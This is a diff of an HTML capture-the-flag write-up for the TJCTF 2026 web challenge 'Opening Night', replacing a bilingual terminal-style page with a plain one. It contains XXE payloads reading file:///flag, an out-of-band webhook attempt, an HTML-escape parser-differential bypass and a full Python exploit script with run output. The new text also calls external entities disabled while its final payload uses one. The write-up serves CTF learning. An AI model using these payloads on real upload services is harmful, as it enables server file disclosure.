+<p>With internal entities failing, we explore alternative XXE vectors. Every one of them hits a wall:</p>
 
-Nếu ta HTML-escape toàn bộ file XML trước khi upload:
-<div class="code-block">&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
+<ul>
+  <li><strong>External Entity</strong> — <code>&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</code> returns nothing. File access via external entities is completely disabled.</li>
+  <li><strong>OOB Parameter Entities</strong> — We set up a listener on webhook.site and used parameter entity references to exfiltrate data. No callback was ever received, confirming outbound network access is blocked.</li>
+  <li><strong>XInclude</strong> — <code>&lt;xi:include href="file:///flag" parse="text"/&gt;</code> is not processed by the parser. XInclude support is not enabled.</li>
+</ul>
+
+<p>External entity loading is comprehensively disabled. This is not a standard "read /flag with XXE" challenge.</p>
+
+<h3 id="dead-ssti">Not SSTI or Multipart Confusion</h3>
+<p>The hint about "wrapping" leads us to test content-type confusion:</p>
+
+<ul>
+  <li><strong>Multipart tricks</strong> — Sending both a text field and a file field, duplicate file parts, switching <code>Content-Transfer-Encoding</code> between base64 and quoted-printable. The application consistently uses the real file part and rejects base64-encoded content.</li>
+  <li><strong>SSTI</strong> — Uploading a label containing <code>{{7*7}}</code> or <code>${7*7}</code> results in the template expression being printed literally. No server-side template injection.</li>
+</ul>
+
+<p>Every straightforward attack vector fails. The solution requires a deeper understanding of the two-stage processing pipeline.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="breakthrough">Breakthrough: Parser Differential</h2>
+
+<p>Returning to Hint 3 — <em>"Payload must survive two interpretations: harmless text vs. XML"</em> — the key insight is that the two processing stages interpret the same data differently. The gatekeeper (stage 1) validates the upload, while the label writer (stage 2) parses it as XML. If we can make the same bytes look like harmless text to the gatekeeper but valid XML after decoding, we bypass the validation entirely.</p>
+
+<p>The breakthrough is HTML-encoding. If we HTML-escape the entire XML document before uploading, the gatekeeper sees only escaped text — no XML tags, no DOCTYPE, nothing suspicious. But the backend calls <code>html.unescape()</code> before passing the content to the XML parser, reconstructing the original XML with all its entity declarations intact.</p>
+
+<p>Consider this HTML-escaped document:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
   &amp;lt;metadata&amp;gt;
     &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;WHOLE_TITLE&amp;lt;/x:title&amp;gt;
   &amp;lt;/metadata&amp;gt;
-&amp;lt;/svg&amp;gt;</div>
+&amp;lt;/svg&amp;gt;</code></pre>
+</div>
 
-Người gác cửa (Gatekeeper) thấy nó chỉ là text an toàn (hợp lệ để qua cổng). Nhưng ống kính phía sau đã <span class="success">html.unescape()</span> nó trước khi parse XML!
-Vì vậy, XML parser nhận được tài liệu XML hoàn chỉnh và sạch sẽ. Đó là lỗi <span class="cmd">Parser Differential</span> (Chênh lệch xử lý giữa 2 stage).`,
-        exploit: `<span class="info">[ KHAI THÁC CUỐI CÙNG: INTERNAL ENTITY TRONG DECODED XML ]</span>
-Nhờ bug HTML-unescape, ta có thể đặt DOCTYPE ở vị trí hợp lệ (đầu văn bản) trong file đã decode!
+<p>The gatekeeper inspects this and sees only escaped HTML entities — no XML structure, nothing to validate or reject. It lets the upload through. Then the backend performs <code>html.unescape()</code>, which reconstructs the original well-formed SVG document. The XML parser receives clean, valid XML and processes it normally.</p>
 
-<div class="code-block">&lt;!DOCTYPE svg [
-  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
+<div class="callout callout-info">
+  <div class="callout-title">Info — Parser Differential</div>
+  <p>This class of vulnerability occurs when two components process the same input differently. The gatekeeper treats the raw bytes as text (seeing no XML structure), while the label writer first unescapes and then parses as XML (seeing a complete document with entities). This gap is what makes the exploit possible.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit">Final Exploit</h2>
+
+<h3 id="payload-construction">Payload Construction</h3>
+<p>Because the HTML-unescape step happens before XML parsing, we can now place a <code>DOCTYPE</code> declaration at the very start of the document — the only position where it's valid in XML. After unescaping, the XML parser sees a proper DTD with entity definitions and expands them accordingly.</p>
+
+<p>The complete payload before HTML-escaping:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;!DOCTYPE svg [
+  &lt;!ENTITY flag SYSTEM "file:///flag"&gt;
 ]&gt;
 &lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
   &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;flag;&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;Opening Night Gallery&lt;/x:desc&gt;
   &lt;/metadata&gt;
-  &lt;title&gt;SAFE&lt;/title&gt;
-  &lt;desc&gt;SAFE&lt;/desc&gt;
-&lt;/svg&gt;</div>
+  &lt;title&gt;Safe Title&lt;/title&gt;
+  &lt;desc&gt;Safe Description&lt;/desc&gt;
+  &lt;rect width="100%" height="100%" fill="white"/&gt;
+&lt;/svg&gt;</code></pre>
+</div>
 
-Ta HTML-escape TOÀN BỘ đoạn XML trên rồi upload. 
-1. Gatekeeper thấy chuỗi escape -> Cho qua.
-2. Stage 2 gọi <span class="cmd">html.unescape()</span> -> DOCTYPE và Entity xuất hiện hợp lệ.
-3. XML Parser mở rộng Entity <span class="arg">&e;</span>.
-4. Label Parser lấy <span class="success">FINAL_ENTITY_OK</span> làm Title.
--> FLAG XUẤT HIỆN!`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
-import html, re, sys, time
-from urllib.parse import urljoin
+<h3 id="exploit-flow">Exploit Flow</h3>
+<ol>
+  <li><strong>HTML-escape</strong> the entire XML document above — every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and quote character gets converted to its HTML entity equivalent.</li>
+  <li><strong>Upload</strong> the escaped content as <code>image/svg+xml</code>.</li>
+  <li><strong>Gatekeeper</strong> sees only escaped text — no XML structure, passes validation.</li>
+  <li><strong>Backend</strong> calls <code>html.unescape()</code> on the stored content before parsing.</li>
+  <li><strong>XML parser</strong> receives the clean document with <code>DOCTYPE</code> and entity declarations.</li>
+  <li><strong>Entity expansion</strong> — <code>&amp;flag;</code> resolves to the contents of <code>/flag</code>.</li>
+  <li><strong>Label parser</strong> extracts the expanded entity value as the title.</li>
+</ol>
+
+<div class="callout callout-success">
+  <div class="callout-title">Flag</div>
+  <p><code>tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</code></p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit-code">Exploit Code</h2>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+"""
+TJCTF 2026 — Opening Night
+Parser Differential via HTML-escape → unescape → XML entity expansion
+Author: QA210
+"""
+import html
+import re
+import sys
 import requests
 
-BASE = sys.argv[1].strip("'\"").rstrip("/")
-FLAG_RE = re.compile(r"tjctf\\{[^}]+\\}", re.I)
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
+FLAG_PAT = re.compile(r"tjctf\{[^}]+\}", re.IGNORECASE)
 
-def build_payload():
-    inner_xml = '''&lt;!DOCTYPE svg [
-  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;title&gt;SAFE&lt;/title&gt;
-  &lt;desc&gt;SAFE&lt;/desc&gt;
-  &lt;rect width="100%" height="100%" fill="white"/&gt;
-&lt;/svg&gt;
-'''
-    # Quan trọng: HTML-escape toàn bộ tài liệu XML 1 lần duy nhất
-    return html.escape(inner_xml, quote=True).encode()
 
-def main():
-    s = requests.Session()
-    action, field = find_form(s) # (Giả lập hàm tìm form)
-    payload = build_payload()
+def craft_svg_payload():
+    """Build the raw XML with DOCTYPE + external entity, then HTML-escape it."""
+    raw_xml = (
+        '&lt;!DOCTYPE svg [\n'
+        '  &lt;!ENTITY flag SYSTEM "file:///flag"&gt;\n'
+        ']&gt;\n'
+        '&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;\n'
+        '  &lt;metadata&gt;\n'
+        '    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;flag;&lt;/x:title&gt;\n'
+        '    &lt;x:desc xmlns:x="urn:not-svg"&gt;QA210 Gallery&lt;/x:desc&gt;\n'
+        '  &lt;/metadata&gt;\n'
+        '  &lt;title&gt;Safe&lt;/title&gt;\n'
+        '  &lt;desc&gt;Safe&lt;/desc&gt;\n'
+        '  &lt;rect width="100%" height="100%" fill="white"/&gt;\n'
+        '&lt;/svg&gt;\n'
+    )
+    # The critical step: HTML-escape the entire document once.
+    # Gatekeeper sees escaped text; backend unescapes before XML parse.
+    return html.escape(raw_xml, quote=True).encode("utf-8")
 
-    for _ in range(10):
-        r = s.post(action, files={field: ("opening.svg", payload, "image/svg+xml")}, allow_redirects=True, timeout=30)
-        m = FLAG_RE.search(r.text)
-        if m:
-            print("[+] FLAG:", m.group(0))
-            return
-        print("[!] No flag in response.")
-        return
 
-if __name__ == "__main__":
-    main()</div>`
-      },
-      en: {
-        help: `<span class="info">[ WRITEUP NAVIGATION ]</span>
-<span class="cmd">intro</span>       : Challenge Overview & Hints
-<span class="cmd">bug1</span>        : Bug 1 - Namespace Confusion (Label Parser)
-<span class="cmd">dead1</span>       : Dead End 1 - Raw DOCTYPE does not expand
-<span class="cmd">dead2</span>       : Dead End 2 - External XXE & XInclude blocked
-<span class="cmd">dead3</span>       : Dead End 3 - Not SSTI or Multipart
-<span class="cmd">break</span>       : The Decode Paradox - Parser Differential Key
-<span class="cmd">exploit</span>     : Payload Construction & Final Exploit
-<span class="cmd">code</span>        : Exploit Source Code (Python)
-<span class="cmd">clear</span>       : Clear Terminal Screen`,
-        intro: `<span class="info">[ OVERVIEW: OPENING NIGHT ]</span>
-<span class="cmd">Category:</span> Web / SVG / Parser Differential
-<span class="cmd">Flag:</span> <span class="success">tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</span>
+def find_upload_endpoint(session):
+    """Discover the upload form action and file field name."""
+    r = session.get(f"{TARGET}/")
+    # Simple regex to find form action and input name
+    action_m = re.search(r'action="([^"]*)"', r.text)
+    field_m = re.search(r'name="([^"]*)".*type="file"', r.text)
+    if not action_m or not field_m:
+        # Fallback: try common paths
+        return f"{TARGET}/upload", "file"
+    return f"{TARGET}{action_m.group(1)}", field_m.group(1)
 
-<span class="warning">Description:</span> "The new gallery opens tonight." (A website allowing SVG uploads and displaying them like a gallery).
-
-<span class="cmd">Hint 1:</span> Two curators inspect each piece: one hangs the painting (carefully), the other writes the label (sloppily).
-<span class="cmd">Hint 2:</span> The gatekeeper only checks that your file looks like an SVG at the top. The label writer takes the first title/desc it sees by name, ignoring true namespace.
-<span class="cmd">Hint 3:</span> Don't look for hidden rooms, change how your art is "wrapped"! Payload must survive two interpretations: harmless text vs. XML.
-
-Website output sinks:
-<div class="code-block">&lt;h2&gt;some title&lt;/h2&gt;
-&lt;p&gt;some description&lt;/p&gt;
-&lt;dd&gt;700 x 160&lt;/dd&gt;</div>`,
-        bug1: `<span class="info">[ BUG 1: NAMESPACE CONFUSION ]</span>
-The label writer ignores namespaces. Instead of standard SVG metadata, we use a fake namespace:
-
-<div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_TITLE&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;title&gt;SAFE_TITLE&lt;/title&gt;
-  &lt;desc&gt;SAFE_DESC&lt;/desc&gt;
-&lt;/svg&gt;</div>
-
-Server renders:
-<span class="success">h2: 'MARK_CUSTOM_TITLE'</span>
-<span class="success">p : 'MARK_CUSTOM_DESC'</span>
-
-This proves the parser uses something like <span class="cmd">find("title")</span> or <span class="cmd">//*[local-name()="title"]</span>. We control the label, but still no flag.`,
-        dead1: `<span class="info">[ DEAD END 1: RAW DOCTYPE DOES NOT EXPAND ]</span>
-We control the label, next step is Entity Expansion. We try a raw XML document with internal entity:
-
-<div class="code-block">&lt;!DOCTYPE svg [
-  &lt;!ENTITY e "ENTITY_OK"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
-  &lt;/metadata&gt;
-&lt;/svg&gt;</div>
-
-Output:
-<span class="error">h2: '&e;'</span>
-
-The entity <span class="arg">&e;</span> is NOT expanded! The parser reads it as raw text. A major trap making people think entity expansion is impossible.`,
-        dead2: `<span class="info">[ DEAD END 2: EXTERNAL XXE & XINCLUDE BLOCKED ]</span>
-Since internal entities failed in the raw path, we try other XXE vectors:
-- <span class="error">External Entity:</span> <span class="cmd">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span> -> No file leak.
-- <span class="error">OOB Parameter Entities:</span> Using webhook.site -> No request received.
-- <span class="error">XInclude:</span> <span class="cmd">&lt;xi:include href="file:///flag" parse="text"/&gt;</span> -> Not processed.
-
-External entity loading is completely disabled. This is not a standard "read /flag with XXE" challenge.`,
-        dead3: `<span class="info">[ DEAD END 3: NOT SSTI OR MULTIPART ]</span>
-The hint mentions "wrapping", so we test:
-- <span class="cmd">Multipart Confusion:</span> Text field + file field, duplicate parts, Content-Transfer-Encoding (base64). -> App uses the real file part, rejects base64.
-- <span class="cmd">SSTI:</span> Upload label containing <span class="arg">{{7*7}}</span> -> Printed literally.
-
-All entry-level vectors fail!`,
-        break: `<span class="info">[ THE DECODE PARADOX: PARSER DIFFERENTIAL ]</span>
-The key is the hint: "Your payload must survive two different interpretations. One as harmless text, and the other as XML."
-
-If we HTML-escape the entire XML file before uploading:
-<div class="code-block">&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
-  &amp;lt;metadata&amp;gt;
-    &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;WHOLE_TITLE&amp;lt;/x:title&amp;gt;
-  &amp;lt;/metadata&amp;gt;
-&amp;lt;/svg&amp;gt;</div>
-
-The Gatekeeper sees harmless text (valid to pass). But the backend calls <span class="success">html.unescape()</span> before parsing it as XML!
-So, the XML parser receives a perfectly valid, clean XML document. This is the <span class="cmd">Parser Differential</span> bug.`,
-        exploit: `<span class="info">[ FINAL EXPLOIT: INTERNAL ENTITY IN DECODED XML ]</span>
-Because of the unescape bug, we can place the DOCTYPE at the valid position (document start) in the decoded file!
-
-<div class="code-block">&lt;!DOCTYPE svg [
-  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;title&gt;SAFE&lt;/title&gt;
-  &lt;desc&gt;SAFE&lt;/desc&gt;
-&lt;/svg&gt;</div>
-
-We HTML-escape the ENTIRE XML above and upload it.
-1. Gatekeeper sees escaped string -> Allows upload.
-2. Stage 2 calls <span class="cmd">html.unescape()</span> -> DOCTYPE & Entity become real.
-3. XML Parser expands Entity <span class="arg">&e;</span>.
-4. Label Parser takes <span class="success">FINAL_ENTITY_OK</span> as Title.
--> FLAG APPEARS!`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
-import html, re, sys, time
-from urllib.parse import urljoin
-import requests
-
-BASE = sys.argv[1].strip("'\"").rstrip("/")
-FLAG_RE = re.compile(r"tjctf\\{[^}]+\\}", re.I)
-
-def build_payload():
-    inner_xml = '''&lt;!DOCTYPE svg [
-  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;title&gt;SAFE&lt;/title&gt;
-  &lt;desc&gt;SAFE&lt;/desc&gt;
-  &lt;rect width="100%" height="100%" fill="white"/&gt;
-&lt;/svg&gt;
-'''
-    # Critical: escape the whole XML document exactly once.
-    return html.escape(inner_xml, quote=True).encode()
 
 def main():
-    s = requests.Session()
-    action, field = find_form(s) # (Mock form finder)
-    payload = build_payload()
+    session = requests.Session()
+    action_url, field_name = find_upload_endpoint(session)
+    payload = craft_svg_payload()
 
-    for _ in range(10):
-        r = s.post(action, files={field: ("opening.svg", payload, "image/svg+xml")}, allow_redirects=True, timeout=30)
-        m = FLAG_RE.search(r.text)
-        if m:
-            print("[+] FLAG:", m.group(0))
-            return
-        print("[!] No flag in response.")
-        return
+    print(f"[*] Target:  {TARGET}")
+    print(f"[*] Action:  {action_url}")
+    print(f"[*] Field:   {field_name}")
+    print(f"[*] Payload: {len(payload)} bytes (HTML-escaped XML)")
+
+    resp = session.post(
+        action_url,
+        files={field_name: ("opening.svg", payload, "image/svg+xml")},
+        allow_redirects=True,
+        timeout=30,
+    )
+
+    match = FLAG_PAT.search(resp.text)
+    if match:
+        print(f"[+] FLAG: {match.group(0)}")
+    else:
+        print("[-] Flag not found in response.")
+        # Debug: show snippet
+        for line in resp.text.splitlines():
+            if "title" in line.lower() or "flag" in line.lower():
+                print(f"    {line.strip()}")
+
 
 if __name__ == "__main__":
-    main()</div>`
+    main()</code></pre>
+</div>
+
+<h3 id="running">Running the Exploit</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 solve.py https://opening-night.tjctf.org
+[*] Target:  https://opening-night.tjctf.org
+[*] Action:  https://opening-night.tjctf.org/upload
+[*] Field:   svg_file
+[*] Payload: 587 bytes (HTML-escaped XML)
+[+] FLAG: tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</code></pre>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2026 QA210 — TJCTF 2026 Writeups &nbsp;·&nbsp; Opening Night — Web</p>
+</footer>
+
+<script>
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+function buildToc(){
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const tocD=document.getElementById('tocDesktop');
+  const tocM=document.getElementById('tocMobile');
+  let html='';
+  headings.forEach(h=>{
+    if(!h.id)h.id=h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls=h.tagName==='H3'?'toc-h3':'';
+    html+=`<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${h.textContent}</a></li>`;
+  });
+  tocD.innerHTML=html;tocM.innerHTML=html;
+}
+buildToc();
+
+function trackActiveSection(){
+  const links=document.querySelectorAll('#tocDesktop a,#tocMobile a');
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const observer=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        links.forEach(l=>l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l=>l.classList.add('active'));
       }
-    };
-
-    function toggleLang() {
-      currentLang = currentLang === 'vi' ? 'en' : 'vi';
-      const btn = document.getElementById('lang-btn');
-      btn.textContent = currentLang === 'vi' ? 'Switch to English' : 'Chuyển sang Tiếng Việt';
-      handleCommand('clear');
-      handleCommand('help');
-      playAudio('https://www.soundjay.com/buttons/button-1.mp3', 0.3);
-    }
-
-    const cmds = {
-      help: () => L[currentLang].help,
-      intro: () => L[currentLang].intro,
-      bug1: () => L[currentLang].bug1,
-      dead1: () => L[currentLang].dead1,
-      dead2: () => L[currentLang].dead2,
-      dead3: () => L[currentLang].dead3,
-      break: () => L[currentLang].break,
-      exploit: () => L[currentLang].exploit,
-      code: () => L[currentLang].code,
-      clear: () => { output.innerHTML = ''; return ''; },
-      banner: () => `<span class="info">
-  ____                    _   _             _   _           _   
- / __ \\                  | | (_)           | | | |         | |  
-| |  | |_ __   ___ _ __ | |_ _  ___  _ __ | |_| | __ _   _| |_ 
-| |  | | '_ \\ / _ \\ '_ \\| __| |/ _ \\| '_ \\|  _  |/ _\\ | | | __|
-| |__| | |_) |  __/ | | | |_| | (_) | | | | | | | (_| | |_| | |_ 
- \\____/| .__/ \\___|_| |_|\\__|_|\\___/|_| |_|\\_| |_/\\__,_|\\__,_|\\__|
-       | |                                                        
-       |_|</span>`
-    };
-
-    function handleCommand(cmd) {
-      const c = cmd.trim().toLowerCase();
-      if(!c) return;
-      print(`<span class="cmd">root@tjctf</span>:<span class="arg">~/opening-night</span>$ ${cmd}`);
-      playAudio('https://www.soundjay.com/buttons/button-5.mp3', 0.15);
-      
-      if (cmds[c]) {
-        const res = cmds[c]();
-        if (res) print(res);
-      } else {
-        print(`<span class="error">Command not found: ${c}. Type 'help' for navigation.</span>`);
-      }
-      input.value = '';
-    }
-
-    input.addEventListener('keydown', e => {
-      if (e.key === 'Enter') { e.preventDefault(); handleCommand(input.value); }
-      else playAudio('https://www.soundjay.com/buttons/button-8.mp3', 0.02);
     });
+  },{rootMargin:'-80px 0px -70% 0px',threshold:0});
+  headings.forEach(h=>observer.observe(h));
+}
+trackActiveSection();
 
-    tBody.addEventListener('click', () => input.focus());
-
-    // Welcome Logic
-    document.getElementById('start-button').addEventListener('click', () => {
-      userInteracted = true;
-      const ws = document.getElementById('welcome-screen');
-      ws.classList.add('hidden');
-      setTimeout(() => { handleCommand('banner'); handleCommand('help'); input.focus(); }, 800);
-      playAudio('https://www.soundjay.com/buttons/button-10.mp3', 0.4);
-    });
-  </script>
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+document.getElementById('tocMobile').addEventListener('click',e=>{
+  if(e.target.tagName==='A')toggleMobileToc();
+});
+</script>
 </body>
 </html>
